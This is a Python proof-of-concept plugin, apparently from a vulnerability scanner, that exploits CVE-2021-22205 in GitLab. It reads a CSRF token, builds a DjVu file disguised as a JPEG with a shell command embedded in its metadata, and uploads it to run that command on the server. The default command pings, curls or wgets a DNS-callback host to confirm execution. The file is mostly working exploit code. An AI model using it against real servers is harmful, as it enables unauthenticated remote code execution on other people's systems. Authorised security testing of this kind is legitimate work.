#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2021-22205
# updated 2024/1/18
# referer: https://github.com/vulhub/vulhub/tree/master/gitlab/CVE-2021-22205

import pathlib
import re
import sys
from typing import Any, Tuple

try:
    from utils import PLUGIN_TYPE, plugin, urlutil
except:
    sys.path.append(pathlib.Path(__file__).parent.parent.__str__())
    from utils import PLUGIN_TYPE, plugin, urlutil


class Plugin(plugin.PluginBase):
    def set_info(self):
        return plugin.Info(
            name='GitLab Community Edition/Enterprise Edition Image File Privilege Escalation',
            catalog='CVE-2021-22205',
            itype=PLUGIN_TYPE.POC,
            protocol='http',
            port=8080,
            ssl_protocol='https',
            ssl_port=8080,
        )

    def run(self, url: urlutil.Url, *args, **kwargs) -> Tuple[bool, Any]:
        if not url.protocol:
            url.protocol, url.port = self.https_or_http(url)
        if not url.protocol:
            return False, 'the network protocol does not match.'
        http = self.make_http_client()
        err, response = http.rq(url.join('/users/sign_in').get_full())
        if err:
            return False, err
        r_csrf = re.search(r'name="csrf-token" content="(.+?)"', response.text)
        if not r_csrf:
            return False, 'not csrf token.'

        info = []
        if not cmd:
            info = self.make_echo_dns()
            if not info:
                return False, 'requires dns type reflection.'
            host = '{}.{}'.format(info['rid'], info['netloc'])
            cmd = 'ping {} || curl {} || wget {}'.format(host, host, host)

        payload = b'AT&TFORM'
        payload += (len(cmd) + 0x55).to_bytes(4, 'big', signed=True)
        payload += b'DJVUINFO\x00\x00\x00\n\x00\x00\x00\x00\x18\x00,\x01\x16\x01BGjp\x00\x00\x00\x00ANTa'
        payload += (len(cmd) + 0x2F).to_bytes(4, 'big', signed=True)
        payload += b'(metadata\n\t(Copyright "\\\n" . qx{'
        payload += cmd.encode()
        payload += b'} . \\\n" b ") )\n'
        files = [('file', ('t.jpg', payload, 'image/jpeg'))]
        err, _ = http.rq(
            url.join('/users/sign_in').get_full(), 'POST', files=files, headers={'X-CSRF-Token': r_csrf.group(1)}
        )
        if err:
            return False, err
        ret = self.get_results(info['rid'])
        return len(ret) > 0, ret


if __name__ == '__main__':
    import time

    from utils import net_echo

    nc = net_echo.DnslogCn()
    nc.start_service()
    plugin = Plugin(nc)

    s_time = time.time()
    ret = plugin.do_testing('192.168.245.128')
    print(ret)
    print(ret['IS_EXIST'])
    print('total time(s):', time.time() - s_time)
